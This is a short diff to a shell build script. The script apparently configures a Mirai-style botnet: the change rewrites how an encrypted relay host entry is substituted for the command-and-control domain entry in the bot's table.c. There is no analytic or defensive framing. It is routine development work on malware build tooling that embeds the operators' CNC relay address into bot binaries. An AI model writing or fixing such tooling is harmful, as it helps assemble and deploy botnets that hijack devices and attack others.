@@ -248,7 +248,10 @@ if [ "$USE_RELAY" -eq 1 ] && [ -n "$RELAY_HOST" ]; then
         cat /tmp/relay_entry.txt
         exit 1
     fi
-    sed -i "s|^.*TABLE_RELAY_1.*|$RELAY_ENTRY|" bot/table.c
+    # Replace the line in table.c - the generated entry uses TABLE_CNC_DOMAIN,
+    # so we need to change it to TABLE_RELAY_1
+    RELAY_LINE=$(echo "$RELAY_ENTRY" | sed "s/TABLE_CNC_DOMAIN/TABLE_RELAY_1/")
+    sed -i "s|^.*TABLE_RELAY_1.*|$RELAY_LINE|" bot/table.c
     log INFO "  Relay: $RELAY_HOST encrypted"
     
     # Set the relay port in includes.h
